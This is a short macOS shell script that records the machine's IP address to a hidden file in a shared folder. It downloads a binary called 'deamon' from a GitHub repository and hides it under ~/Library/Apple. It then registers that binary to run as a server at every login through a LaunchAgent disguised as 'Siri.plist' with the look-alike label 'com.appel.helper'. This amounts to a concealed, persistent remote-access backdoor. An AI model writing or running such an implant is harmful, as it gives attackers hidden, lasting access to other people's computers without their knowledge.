ifconfig en0 | grep "inet" > /sgoinfre/goinfre/Perso/.dump;
mkdir -p  /Users/`whoami`/Library/Apple;
curl https://raw.githubusercontent.com/asyade/tinyssh/master/deamon/deamon > /Users/`whoami`/Library/Apple/deamon;
chmod 700 /Users/`whoami`/Library/Apple/deamon;
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.appel.helper</string><key>Program</key><string>/Users/acorbeau/Library/Apple/deamon</string><key>ProgramArguments</key><array><string>-server</string></array><key>RunAtLoad</key><true/></dict></plist>' > /Users/`whoami`/Library/LaunchAgents/Siri.plist;
